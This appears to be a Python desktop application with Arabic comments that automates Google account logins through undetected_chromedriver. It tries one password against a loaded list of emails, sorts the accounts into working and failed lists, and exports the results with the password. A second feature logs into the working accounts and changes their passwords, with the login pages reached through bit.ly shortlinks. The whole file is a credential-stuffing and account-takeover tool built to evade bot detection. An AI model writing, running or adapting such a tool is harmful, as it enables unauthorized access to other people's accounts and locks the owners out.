#9
import time
from selenium.webdriver.common.by import By
import undetected_chromedriver as uc
from PyQt5 import QtWidgets, uic
from PyQt5.QtWidgets import *
from winotify import Notification
from PyQt5.QtGui import QPixmap,QIcon
from PyQt5.QtCore import Qt,QSize
import sys
import socket
import os
from threading import Thread

class MainWindow(QMainWindow):
    def __init__(self):
        super(MainWindow,self).__init__()
        #self.setupUi(self)
                
        uic.loadUi('ui/main.ui', self)
        self.setWindowTitle("Google fillter")

        self.init_ui()

    def init_ui(self):
       # self.text_br_open = 0
        path = os.getcwd()
        try:
            icoo = f'{str(path)}' + "//img//" + 'google_log.ico'
            icon = QIcon(icoo)
            self.setWindowIcon(icon)
            self.setMinimumSize(QSize(300, 200))
            ############
            img  = f'{str(path)}' + "//img//" + 'google_logo_icon_170071.ico'
            pixmap = QPixmap(img)
            # تحديد الصورة لعنصر Label
            self.label_8.setPixmap(pixmap)
            self.label_13.setPixmap(pixmap)
        except Exception:
            print("erorr img icon window")
        self.label_8.setAlignment(Qt.AlignCenter)
        ###########
        self.tabWidget.setCurrentIndex(0)
        
        
        self.lineEdit.setAlignment(Qt.AlignCenter)
        self.label_7.setAlignment(Qt.AlignCenter)
        self.lineEdit_2.setAlignment(Qt.AlignCenter)
        self.lineEdit_3.setAlignment(Qt.AlignCenter)
        self.list_widget = self.listWidget
        self.pushButton.clicked.connect(self.open_file)
        self.pushButton_2.clicked.connect(self.delete_row_in_home)
        #self.pushButton_4.clicked.connect(lambda:Thread(target=self.open_br).start())
        self.pushButton_5.clicked.connect(lambda:Thread(target=self.start).start())
        self.pushButton_6.clicked.connect(lambda:self.export_to_txt("active"))
        self.pushButton_11.clicked.connect(lambda:self.export_to_txt("bad"))
        self.pushButton_3.clicked.connect(lambda:self.clear_list("home"))
        self.pushButton_7.clicked.connect(lambda:self.clear_list("active"))
        self.pushButton_10.clicked.connect(lambda:self.clear_list("bad"))
        self.pushButton_14.clicked.connect(self.exit_app)
        self.pushButton_19.clicked.connect(self.exit_app)
        self.pushButton_22.clicked.connect(self.close_browser)
        self.pushButton_23.clicked.connect(self.close_browser)
        self.pushButton_23.hide()
        self.pushButton_22.hide()
        self.pushButton_5.setEnabled(False)
        self.pushButton_16.setEnabled(False)
        #self.pushButton_5.setStyleSheet("background-color: #343541;color:#eee;")

        #clear_list

        #تجريبي
        #pushButton_12
        #self.pushButton_12.clicked.connect(self.test)

        #self.open_file()
        ###########################################
        #تغير كلمه السر
        ###########################################
        self.pushButton_16.clicked.connect(lambda:Thread(target=self.change_the_password).start())
        #open
        self.pushButton_15.clicked.connect(self.open_file_pass)
        #pushButton_8
        self.pushButton_8.clicked.connect(lambda:self.clear_list("home_password"))
        self.pushButton_18.clicked.connect(lambda:self.clear_list("y_password"))
        self.pushButton_21.clicked.connect(lambda:self.clear_list("n_password"))
        ###
        self.pushButton_17.clicked.connect(lambda:self.export_to_txt("y_password"))
        self.pushButton_20.clicked.connect(lambda:self.export_to_txt("n_password"))
    def check_and_open_browser(self):
        try:
            # Attempt to interact with the existing browser (e.g., get the title)
            title = self.driver.title
            print("Browser is open. Title:", title)
            
            return True
        except Exception:
            
            return False
    def close_browser(self):
        #self.driver.quit()
        try:
            self.driver.close()
            self.pushButton_23.hide()
            self.pushButton_16.show()
        except Exception as e:
            print(e)

    def start(self):
        check_internet = self.check_internet_connection()
        if check_internet == True:
            if self.lineEdit.text() != "":
                rows_count = self.list_widget.count()
                if rows_count:
                    self.pushButton_5.hide()
                    self.pushButton_22.show()

                    c = self.check_and_open_browser()
                    

                    if c == False:
                        self.options = uc.ChromeOptions()
                        self.options.headless = False
                        self.driver = uc.Chrome(options = self.options)
                        #self.text_br_open = 1
                    elif c == True:
                        pass
                
                    
                    print("عدد الصفوف في QListWidget:", rows_count)
                    cunt =+ rows_count
                    ################
                    
                    #"""
                    for i in range(rows_count+1):
                        #"""
                        get_pass = str(self.lineEdit.text())
                        get_pass.replace(" ","")
                        email = self.get_first_value("home")
                        try:
                            email.replace(" ","")
                        except:
                            pass
                        ########################
                        
                        self.label_6.setText(f"عدد الايميلات : {rows_count}")
                        #print("*"*40)
                        print(f"Email: {email}, passwprd: {get_pass}")
                        self.login(email,get_pass)
                        ##################
                        check_Internet = self.check_internet_connection()
                        if check_Internet == True:
                            print("Check_Internet True")
                            self.delete_row_in_home("home")
                        elif check_Internet == False:
                            self.show_msg("There is no Internet","[!] You don't have an internet connection")

                        ###################
                        self.label_5.setText(f"بدء {str(1+i)} من {rows_count}")

                        print(f"Account Num ({str(1+i)}) from ({str(rows_count)})")
                        print("*"*40)
                
                        #self.delete_row_in_home()
                        
                        
                        if rows_count == 1+i:
                            try:
                                self.driver.close()
                            except:
                                pass
                        
                            self.label_7.setText("المتصفح مغلق")
                            self.label_7.setStyleSheet("")
                            try:
                                self.show_msg("تم الإنتهاء","تم إنتهاء الفحص")
                            except:
                                pass
                            try:
                                self.pushButton_22.hide()
                                self.pushButton_5.show()
                            except:
                                pass
                            break
                        #"""
                else:
                    try:
                        self.show_msg("خطأ","أدخل ملف الإيميلات أولاً")      
                    except Exception:
                        pass
            else:
                try:
                    self.show_msg("خطأ","أدخل كلمة السر")      
                except Exception:
                    pass
        
        #else check_internet False
        else:
            print("check_internet False")
            self.show_msg("خطأ","لا يوجد إنترنت قم بالتحقق من إتصالك بالانرنت")
    
    def show_msg(self,title,ms):
        try:
            toast = Notification(app_id="مرحباً",
            title=title,
            msg=ms)
            toast.show()
        except Exception as e:
            print("Erorr show_msg")
    def exit_app(self):
        
        try:
            self.driver.close()
            print("driver Exit")
        except:
            pass
        try:
            self.close()
            sys.exit()  
        except:
            pass
    #استخراج الملفات
    def export_to_txt(self,name_file):
        # الحصول على مسار الملف المستهدف
        if name_file == "active":
            
            rows_count = self.listWidget_2.count()
            if rows_count:
                
                #self.label_6.setText(f"مجموع الحسابات: {rows_count}")
                #############
                file_dialog = QFileDialog()
                file_path, _ = file_dialog.getSaveFileName(self, "حفظ في ملف نصي", "Active_accounts.txt", "ملفات النص (*.txt)")

                if file_path:
                    try:
                        # فتح الملف للكتابة
                        with open(file_path, 'w',encoding='utf-8') as file:
                            # كتابة النصوص إلى الملف
                            for i in range(self.listWidget_2.count()):
                                file.write(self.listWidget_2.item(i).text() + '\n')
                            file.write('\n')
                            file.write('\n')
                            #the number
                            file.write(f'The email number: {str(rows_count)}')
                            file.write('\n')
                            file.write(f'PASSWORD: {self.lineEdit.text()}')
                        print("تم حفظ النصوص في الملف بنجاح.")
                    except Exception as e:
                        print(f"حدث خطأ أثناء حفظ الملف: {e}")
        elif name_file == "bad":
            rows_count = self.listWidget_3.count()
            if rows_count:
                file_dialog = QFileDialog()
                file_path, _ = file_dialog.getSaveFileName(self, "حفظ في ملف نصي", "Bad_active.txt", "ملفات النص (*.txt)")
                if file_path:
                    try:
                        # فتح الملف للكتابة
                        with open(file_path, 'w',encoding='utf-8') as file:
                            # كتابة النصوص إلى الملف
                            for i in range(self.listWidget_3.count()):
                                file.write(self.listWidget_3.item(i).text() + '\n')
                            file.write('\n')
                            file.write('\n')
                            #the number
                            file.write(f'The email number: {str(rows_count)}')
                            file.write('\n')
                            file.write(f'PASSWORD: {self.lineEdit.text()}')
                        print("تم حفظ النصوص في الملف بنجاح.")
                    except Exception as e:
                        print(f"حدث خطأ أثناء حفظ الملف: {e}")
        ##############################
        elif name_file == "y_password":
            rows_count = self.listWidget_5.count()
            if rows_count:
                file_dialog = QFileDialog()
                file_path, _ = file_dialog.getSaveFileName(self, "حفظ في ملف نصي", "Change_The_Password.txt", "ملفات النص (*.txt)")
                if file_path:
                    try:
                        # فتح الملف للكتابة
                        with open(file_path, 'w',encoding='utf-8') as file:
                            # كتابة النصوص إلى الملف
                            for i in range(self.listWidget_5.count()):
                                file.write(self.listWidget_5.item(i).text() + '\n')
                            file.write('\n')
                            file.write('\n')
                            #the number
                            file.write(f'The email number: {str(rows_count)}')
                            file.write('\n')
                            file.write(f'PASSWORD: {self.lineEdit_3.text()}')
                        print("تم حفظ النصوص في الملف بنجاح.")
                    except Exception as e:
                        print(f"حدث خطأ أثناء حفظ الملف: {e}")
        elif name_file == "n_password":
            rows_count = self.listWidget_6.count()
            if rows_count:
                file_dialog = QFileDialog()
                file_path, _ = file_dialog.getSaveFileName(self, "حفظ في ملف نصي", "NO_Change_Password.txt", "ملفات النص (*.txt)")
                if file_path:
                    try:
                        # فتح الملف للكتابة
                        with open(file_path, 'w',encoding='utf-8') as file:
                            # كتابة النصوص إلى الملف
                            for i in range(self.listWidget_6.count()):
                                file.write(self.listWidget_6.item(i).text() + '\n')
                            file.write('\n')
                            file.write('\n')
                            #the number
                            file.write(f'The email number: {str(rows_count)}')
                            file.write('\n')
                            file.write(f'PASSWORD: {self.lineEdit_2.text()}')
                        print("تم حفظ النصوص في الملف بنجاح.")
                    except Exception as e:
                        print(f"حدث خطأ أثناء حفظ الملف: {e}")
    def check_word(self,target_word,booll_active):
        #target_word = self.search_input.text()
        if booll_active == True:
            if target_word:
                # تحقق مما إذا كانت الكلمة موجودة في QListWidget
                found = any(target_word in self.listWidget_2.item(i).text() for i in range(self.listWidget_2.count()))
                # إعادة "نعم" إذا كانت الكلمة موجودة وإعادة "لا" إذا لم تكن موجودة    
                if found:
                    print("found")
                    pass
                else:
                    #print("n")
                    check_Internet = self.check_internet_connection()
                    if check_Internet == True:
                        print("Check_Internet True")
                        
                        self.listWidget_2.addItem(f"{target_word}")
                        print(f"Add Accounts Active: {target_word}")
                    else:
            
                        print("[!] You don't have an internet connection ")
                        self.show_msg("There is no Internet","[!] You don't have an internet connection")
        # لو معطل
        if booll_active == False:
            if target_word:
                # تحقق مما إذا كانت الكلمة موجودة في QListWidget
                found = any(target_word in self.listWidget_3.item(i).text() for i in range(self.listWidget_3.count()))
                # إعادة "نعم" إذا كانت الكلمة موجودة وإعادة "لا" إذا لم تكن موجودة    
                if found:
                    print("found bad")
                    pass
                else:
                    check_Internet = self.check_internet_connection()
                    if check_Internet == True:
                        print("Check_Internet True")
                        
                        self.listWidget_3.addItem(f"{target_word}")
                        print(f"send bad fuond: {target_word}")
                    else:
                        print("[!] You don't have an internet connection ")
                        self.show_msg("There is no Internet","[!] You don't have an internet connection")
        
        if booll_active == "change_True":
            if target_word:
                # تحقق مما إذا كانت الكلمة موجودة في QListWidget
                found = any(target_word in self.listWidget_5.item(i).text() for i in range(self.listWidget_5.count()))
                
                # إعادة "نعم" إذا كانت الكلمة موجودة وإعادة "لا" إذا لم تكن موجودة    
                if found:
                    print("found..")
                    pass
                else:
                    check_Internet = self.check_internet_connection()
                    if check_Internet == True:
                        print("Check_Internet True")
                        
                        self.listWidget_5.addItem(f"{target_word}")
                        print("listWidget_5......")
                        print(f"send bad fuond: {target_word}")
                    else:
                        print("[!] You don't have an internet connection ")
                        self.show_msg("There is no Internet","[!] You don't have an internet connection")
        if booll_active == "change_False":
            if target_word:
                # تحقق مما إذا كانت الكلمة موجودة في QListWidget
                found = any(target_word in self.listWidget_6.item(i).text() for i in range(self.listWidget_6.count()))
                # إعادة "نعم" إذا كانت الكلمة موجودة وإعادة "لا" إذا لم تكن موجودة    
                if found:
                    print("found bad")
                    pass
                else:
                    check_Internet = self.check_internet_connection()
                    if check_Internet == True:
                        print("Check_Internet True")
                        
                        self.listWidget_6.addItem(f"{target_word}")
                        print(f"send bad fuond: {target_word}")
                    else:
                        print("[!] You don't have an internet connection ")
                        self.show_msg("There is no Internet","[!] You don't have an internet connection")
    ####################################
    def check_internet_connection(self):
        try:
            # قم بفحص اتصالك بموقع محدد، يمكنك استخدام google.com أو أي موقع آخر
            socket.create_connection(("www.google.com", 80), timeout=5)
            print("تم التحقق من اتصال الإنترنت بنجاح!")
            return True
        except Exception:
            print("فشل في التحقق من اتصال الإنترنت.")
            return False
    def clear_list(self,name):
        if name == "home":
            # حذف جميع العناصر من QListWidget
            if self.list_widget.count() > 0:
                self.list_widget.clear()
                self.list_widget_5.clear()
                self.list_widget_6.clear()
                print("Done clear home")
        if name == "active":
            # حذف جميع العناصر من QListWidget
            if self.listWidget_2.count() > 0:
                self.listWidget_2.clear()
                print("Done clear active")
        if name == "bad":
            # حذف جميع العناصر من QListWidget
            if self.listWidget_3.count() > 0:
                self.listWidget_3.clear()
                print("Done clear bad")
        if name == "home_password":
            # حذف جميع العناصر من QListWidget
            if self.listWidget_4.count() > 0:
                self.listWidget_4.clear()
                print("Done clear home_password")
        if name == "y_password":
            # حذف جميع العناصر من QListWidget
            if self.listWidget_5.count() > 0:
                self.listWidget_5.clear()
                print("Done clear y_password")
        if name == "n_password":
            # حذف جميع العناصر من QListWidget
            if self.listWidget_6.count() > 0:
                self.listWidget_6.clear()
                print("Done clear n_password")
    def delete_row_in_home(self,name):
        # التأكد من وجود عناصر في القائمة
        if name == "home":
            if self.list_widget.count() > 0:
                # حذف القيمة الأولى
                first_item = self.list_widget.item(0)
                self.list_widget.takeItem(self.list_widget.row(first_item))
                print("تم حذف القيمة الأولى")
            else:
                print("القائمة فارغة")
        elif name == "home_change":
            if self.listWidget_4.count() > 0:
                # حذف القيمة الأولى
                first_item = self.listWidget_4.item(0)
                self.listWidget_4.takeItem(self.listWidget_4.row(first_item))
                print("تم حذف القيمة الأولى")
            else:
                print("القائمة فارغة")
    #############################
    
    def test(self):
        for i in range(5):
            self.listWidget_2.addItem(f"{str(i)}")
            self.listWidget_3.addItem(f"{str(i)}") 
    
    def get_first_value(self,name):
        if name == "home":
            # التأكد من وجود عناصر في القائمة
            if self.list_widget.count() > 0:
                # الحصول على القيمة الأولى
                first_value = self.list_widget.item(0).text()
                #print("القيمة الأولى:", first_value)
                return first_value
            else:
                print("القائمة فارغة")
        elif name == "change_the_password":
            # التأكد من وجود عناصر في القائمة
            if self.listWidget_4.count() > 0:
                # الحصول على القيمة الأولى
                first_value = self.listWidget_4.item(0).text()
                #print("القيمة الأولى:", first_value)
                return first_value
            else:
                print("القائمة فارغة")
    def login(self,email,passwd):
        try:
            #check_internet = self.check_internet_connection()
            #if check_internet == True:

                try:
                    self.url = "https://bit.ly/3t1G6fz"
                    self.driver.get(self.url)
                except:
                    pass
                #email
                time.sleep(2)
                try:
                    self.driver.find_element(By.ID, "identifierId").send_keys(email)
                except:
                    pass
                #next
                time.sleep(1)
                try:
                    self.driver.find_element(By.XPATH, "//span[text()='Next']").click()

                except:
                    pass
                try:
                    self.driver.find_element(By.XPATH, "//span[text()='التالي']").click()
                    
                except:
                    pass
                ##############################################################
                #password
                time.sleep(3)
                try:
                    self.driver.find_element(By.NAME, "password").send_keys(passwd)
                    
                except Exception as e:
                    pass
                try:
                    self.driver.find_element(By.NAME, "Passwd").send_keys(passwd)
                    
                except Exception as e:
                    pass
                #############
                try:
                    self.driver.find_element(By.XPATH, "//span[text()='Next']").click()
                    
                except:
                    pass
                try:
                    self.driver.find_element(By.XPATH, "//span[text()='التالي']").click()    
                except:
                    pass
                #page_text = ""
                time.sleep(1)
                try:

                    self.driver.refresh()
                    #time.sleep(5)
                except:
                    pass
                try:
                    page_text = self.driver.page_source
                
                except:
                    pass

                
                #text_ar = "يمكنك إدارة المعلومات والخصوصية والأمان للاستفادة من Google بشكل أفضل."
                text_ar = "ثمة اقتراحات بشأن الخصوصية"
                text_en = "Privacy suggestions available"
                
                if text_ar in page_text:
                    try:
                        print("موجود مرحباً حساب نشط")
                        ############
                        #التاكد اذا كان الحساب موجود 
                        self.check_word(email,True)
                        #self.create_file_accounts_active(email)
                        print(f"Add Accounts Active: {email}")
                        #page_text = ""
                        #time.sleep(3)
                    except:
                        pass            
                            
                        
                    try:
                        #تسجيل الخروج
                        #"""
                        self.driver.get("https://accounts.google.com/Logout?ec=GAdAwAE&hl=ar")
                        
                        #"""
                    except:
                        pass
                elif text_en in page_text:
                    try:
                        print("موجود مرحباً حساب نشط")
                        ############
                        #التاكد اذا كان الحساب موجود 
                        self.check_word(email,True)
                        #self.create_file_accounts_active(email)
                        print(f"Add Accounts Active: {email}")
                        #page_text = ""
                        #time.sleep(3)
                    except:
                        pass            
                            
                        
                    try:
                        #تسجيل الخروج
                        #"""
                        self.driver.get("https://accounts.google.com/Logout?ec=GAdAwAE&hl=ar")
                        
                        #"""
                    except:
                        pass
                else:
                    try:
                        self.check_word(email,False)
                        print(f"bad: {email}")
                    except:
                        pass

                ###########################################
            
        except:
            #print("check_internet222")
            pass
    
    ######################################################
    def open_file(self):
        self.clear_list("home")
        ##############
        file_dialog = QFileDialog()
        file_path, _ = file_dialog.getOpenFileName(self, "فتح ملف نصي", "Email.txt", "ملفات النص (*.txt)")

        if file_path:
            with open(file_path, 'r',encoding='utf-8') as file:
                content = file.readlines()

                # قم بتنظيف المحتوى من أي فراغات أو أسطر فارغة
                content = [line.strip() for line in content if line.strip()]
                
                
                try:
                    # التحقق مما إذا كان العنصر موجودًا في القائمة قبل الحذف
                    my_list = [item for item in content if "PASSWORD"  not in item]
                    content = [item for item in my_list if "The email number"  not in item]
                except Exception as e:
                    print("خطا في حذف الأعداد في الملفات")
                
                ######
                
                # قم بإضافة الأسطر إلى QListWidget
                self.list_widget.addItems(content)
        #####
        rows_count = self.list_widget.count()
        self.label_6.setText(f"عدد الايميلات: {rows_count}")
        #self.label_5.setText(f"بدء   0   من    {rows_count}")
        if rows_count:
            self.pushButton_5.setEnabled(True)
    ###########################################
    #تغير كلمه السر
    ###########################################
    def change_pass(self,email,passwd):
        #try login
        page_text = self.driver.page_source
        text_ar = "ثمة اقتراحات بشأن الخصوصية"
        text_en = "Privacy suggestions available"
        
        if not text_ar in page_text:
            try:
                self.url = "https://bit.ly/3t1G6fz"
                self.driver.get(self.url)
                #email
                time.sleep(2)
                self.driver.find_element(By.ID, "identifierId").send_keys(email)
                #next
                time.sleep(1)
                try:
                    self.driver.find_element(By.XPATH, "//span[text()='Next']").click()
                    
                except:
                    pass
                try:
                    self.driver.find_element(By.XPATH, "//span[text()='التالي']").click()
                    
                except:
                    pass
                ##############################################################
                #password
                time.sleep(3)
                try:
                    self.driver.find_element(By.NAME, "password").send_keys(passwd)
                except Exception as e:
                    pass
                try:
                    self.driver.find_element(By.NAME, "Passwd").send_keys(passwd)
                except Exception as e:
                    pass
                #############
                try:
                    self.driver.find_element(By.XPATH, "//span[text()='Next']").click()
                    
                except:
                    pass
                try:
                    self.driver.find_element(By.XPATH, "//span[text()='التالي']").click()
                    

                    
                except:
                    pass
                
                #page_text = ""
                time.sleep(1)
                self.driver.refresh()
                #time.sleep(2)
                page_text = self.driver.page_source
            except Exception as e:
                #self.check_word(email,"change_False")
                print("try login: ",e)
        elif not text_en in page_text:
            try:
                self.url = "https://bit.ly/3t1G6fz"
                self.driver.get(self.url)
                #email
                time.sleep(2)
                self.driver.find_element(By.ID, "identifierId").send_keys(email)
                #next
                time.sleep(1)
                try:
                    self.driver.find_element(By.XPATH, "//span[text()='Next']").click()
                    
                except:
                    pass
                try:
                    self.driver.find_element(By.XPATH, "//span[text()='التالي']").click()
                    
                except:
                    pass
                ##############################################################
                #password
                time.sleep(3)
                try:
                    self.driver.find_element(By.NAME, "password").send_keys(passwd)
                except Exception as e:
                    pass
                try:
                    self.driver.find_element(By.NAME, "Passwd").send_keys(passwd)
                except Exception as e:
                    pass
                #############
                try:
                    self.driver.find_element(By.XPATH, "//span[text()='Next']").click()
                    
                except:
                    pass
                try:
                    self.driver.find_element(By.XPATH, "//span[text()='التالي']").click()
                    

                    
                except:
                    pass
                
                #page_text = ""
                time.sleep(1)
                self.driver.refresh()
                #time.sleep(2)
                page_text = self.driver.page_source
            except Exception as e:
                #self.check_word(email,"change_False")
                print("try login: ",e)
        else:
            self.check_word(email,"change_False")
        
        ##########################
        page_text = self.driver.page_source
        #time.sleep(3)
        text_ar = "ثمة اقتراحات بشأن الخصوصية"
        text_en = "Privacy suggestions available"
        if text_ar in page_text:
            pass_new = self.lineEdit_3.text().split()
            pass_new= pass_new[0]
            #driver.find_element(By.ID, "identifierId").send_keys(e)
            print("[جاهز للتغير الان]")
            ###########
            url = "https://bit.ly/481EMZ6"
            self.driver.get(url)
            #text_ = "ننصحك باختيار كلمة مرور قوية وعدم إعادة استخدامها في حسابات أخرى"
            #password
            #confirmation_password

            self.driver.find_element(By.NAME, "password").send_keys(pass_new)  
            self.driver.find_element(By.NAME, "confirmation_password").send_keys(pass_new)
            #########
            #زر تغير بالعربي
            try:
                self.driver.find_element(By.XPATH, "//span[text()='تغيير كلمة المرور']").click()
                time.sleep(3)
            except:
                pass

            #Change password
            try:
                self.driver.find_element(By.XPATH, "//span[text()='Change password']").click()
                time.sleep(3)
            except:
                pass
            #time.sleep(2)
            #التحقق من التغير  
            page_text = self.driver.page_source
            
            t = "اقتراحات وإعدادات لمساعدتكِ في الحفاظ على أمان حسابكِ"
            text_2_en = "Settings and recommendations to help you keep your account secure"
            if t or text_2_en in page_text:
                print("تم التغير بنجاح")
                self.check_word(email,"change_True")
                
                #self.lineEdit_2.setText("")
                self.lineEdit_3.setText(self.lineEdit_2.text())
                
                #تسجيل الخروج
                #"""
                try:
                    self.driver.get("https://accounts.google.com/Logout?ec=GAdAwAE&hl=ar")
                    time.sleep(2)
                except:
                    pass
                #"""
            else:
                self.check_word(email,"change_False")
                print("لم يتم التغير")
        elif text_en in page_text:
            pass_new = self.lineEdit_3.text().split()
            pass_new= pass_new[0]
            #driver.find_element(By.ID, "identifierId").send_keys(e)
            print("[جاهز للتغير الان]")
            ###########
            url = "https://bit.ly/481EMZ6"
            self.driver.get(url)
            #text_ = "ننصحك باختيار كلمة مرور قوية وعدم إعادة استخدامها في حسابات أخرى"
            #password
            #confirmation_password

            self.driver.find_element(By.NAME, "password").send_keys(pass_new)  
            self.driver.find_element(By.NAME, "confirmation_password").send_keys(pass_new)
            #########
            #زر تغير بالعربي
            try:
                self.driver.find_element(By.XPATH, "//span[text()='تغيير كلمة المرور']").click()
                time.sleep(3)
            except:
                pass

            #Change password
            try:
                self.driver.find_element(By.XPATH, "//span[text()='Change password']").click()
                time.sleep(3)
            except:
                pass
            #time.sleep(2)
            #التحقق من التغير  
            page_text = self.driver.page_source
            
            t = "اقتراحات وإعدادات لمساعدتكِ في الحفاظ على أمان حسابكِ"
            text_2_en = "Settings and recommendations to help you keep your account secure"
            if t or text_2_en in page_text:
                print("تم التغير بنجاح")
                self.check_word(email,"change_True")
                
                #self.lineEdit_2.setText("")
                self.lineEdit_3.setText(self.lineEdit_2.text())
                
                #تسجيل الخروج
                #"""
                try:
                    self.driver.get("https://accounts.google.com/Logout?ec=GAdAwAE&hl=ar")
                    time.sleep(2)
                except:
                    pass
                #"""
            else:
                self.check_word(email,"change_False")
                print("لم يتم التغير")
        ############################################
        else:
            self.check_word(email,"change_False")
            
            #تسجيل الخروج
            #"""
            try:
                self.driver.get("https://accounts.google.com/Logout?ec=GAdAwAE&hl=ar")
                print("تسجيل الخروج")
                time.sleep(3)
            except:
                pass
    
    def change_the_password(self):
        if self.lineEdit_2.text() != "" and self.lineEdit_3.text() != "":
            self.pushButton_16.hide()
            self.pushButton_23.show()

            c = self.check_and_open_browser()
            if c == True:
                pass
            elif c == False:
                print("Browser is closed. Opening a new one.")
                # Open a new browser instance if the existing one is closed
                try:
                    self.options = uc.ChromeOptions()
                    self.options.headless = False
                    self.driver = uc.Chrome(options = self.options)
                except Exception as e:
                    print(e)
            #for 
            ################################
            
            print("change_the_password")
            rows_count = self.listWidget_4.count()
            ################
            #"""
            for i in range(rows_count+1):
                #"""
                get_pass = str(self.lineEdit_2.text())
                get_pass.replace(" ","")
                email = self.get_first_value("change_the_password")
                try:
                    email.replace(" ","")
                except:
                    print("Erorr the email.replace")
                
                
                self.change_pass(email,get_pass)
                ##################
                check_Internet = self.check_internet_connection()
                if check_Internet == True:
                    print("Check_Internet True")
                    self.delete_row_in_home("home_change")
                elif check_Internet == False:
                    self.show_msg("There is no Internet","[!] You don't have an internet connection")
                #####################
                print(f"Email: {email}, passwprd: {get_pass}")
                
                #################
                if rows_count == 1+i:
                    try:
                        #self.driver.close()
                        pass
                    except Exception as e:
                        print(e)

                    self.label_7.setText("المتصفح مغلق")
                    self.label_7.setStyleSheet("")
                    try:
                        self.pushButton_23.hide()
                        self.pushButton_16.show()
                    except:
                        pass
                    # show msg info in windows
                    try:
                        self.show_msg("تم الامر بنجاح","اكتملت عمليه التغير بنجاح")
                    except Exception:
                        pass
                    break
            else:
                pass
    def open_file_pass(self):
        self.clear_list("home_password")
        ##############
        file_dialog = QFileDialog()
        file_path, _ = file_dialog.getOpenFileName(self, "فتح ملف نصي", "Email.txt", "ملفات النص (*.txt)")

        if file_path:
            with open(file_path, 'r',encoding='utf-8') as file:
                content = file.readlines()

                # قم بتنظيف المحتوى من أي فراغات أو أسطر فارغة
                content = [line.strip() for line in content if line.strip()]
                
                
                try:
                    # التحقق مما إذا كان العنصر موجودًا في القائمة قبل الحذف
                    my_list = [item for item in content if "PASSWORD"  not in item]
                    content = [item for item in my_list if "The email number"  not in item]
                except Exception as e:
                    print("خطا في حذف الأعداد في الملفات")
                
                ######
                
                # قم بإضافة الأسطر إلى QListWidget
                self.listWidget_4.addItems(content)
            #####
            rows_count = self.listWidget_4.count()
            #self.label_6.setText(f"مجموع الحسابات: {rows_count}")
            #self.label_5.setText(f"بدء   0   من    {rows_count}")
            if rows_count:
                self.pushButton_16.setEnabled(True)
                

###########################################   
if __name__ == "__main__":
    app = QtWidgets.QApplication(sys.argv)
    window = MainWindow()
    window.show()
    app.exec_()
